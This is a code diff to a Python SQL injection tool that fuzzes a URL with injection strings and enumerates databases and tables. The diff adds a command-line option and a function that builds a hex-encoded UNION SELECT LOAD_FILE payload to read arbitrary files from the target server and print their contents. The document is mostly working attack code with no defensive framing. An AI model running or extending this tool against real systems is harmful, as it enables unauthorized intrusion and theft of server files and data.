@@ -5,6 +5,7 @@ from termcolor import colored
 import getopt
 import re
 from collections import defaultdict
+import codecs
 
 def banner():
     print("\n********************")
@@ -27,7 +28,7 @@ def start(argv):
         sys.exit()
 
     try:
-        opts, args = getopt.getopt(argv, "w:i:")
+        opts, args = getopt.getopt(argv, "w:i:f:")
     except getopt.GetoptError:
         print("Error en arguments")
         sys.exit()
@@ -37,6 +38,8 @@ def start(argv):
             url = arg
         elif opt == '-i':
             dictio = arg
+        elif opt == '-f':
+            filename = arg
 
     try:
        print('Opening injections file: ' + dictio)
@@ -46,10 +49,10 @@ def start(argv):
         print("Failed opening file: " + dictio)
         sys.exit()
 
-    launcher(url, name)
+    launcher(url, name, filename)
 
 
-def launcher(url, diction):
+def launcher(url, diction, file):
     injected = []
     for sql_inject in diction:
         injected.append(url.replace('FUZZ', sql_inject))
@@ -81,7 +84,9 @@ def launcher(url, diction):
         print(colored(base,'blue'))
         print(colored('---------------------------------', 'blue'))
         [print(table) for table in databases[base]]
-
+    print(colored('---------------------------------', 'blue'))
+    print(colored('The '+file+' is:','blue'))
+    readfile(url,file)
 
 
 
@@ -162,6 +167,15 @@ def detect_table_names(url):
         else:
             pass
     return databases
+
+def readfile(url, filename):
+    hex_filename = '0x' + filename.encode("utf-8").hex()
+#    full_hex = '0x'+hex_filename
+    new_url = url.replace("FUZZ","-1'union select 1,LOAD_FILE(%s)-- -" % hex_filename)
+    req = requests.get(new_url)
+    search_pattern = re.compile(r'role: ((?:.+\n)+)')
+    result_of_parse = search_pattern.findall(req.text)
+    print(result_of_parse[0])
 
 if __name__ == "__main__":
     try:
